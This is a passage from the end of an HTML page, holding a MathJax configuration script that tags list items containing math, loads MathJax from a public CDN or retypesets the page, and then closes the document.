              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  

</body>
</html>
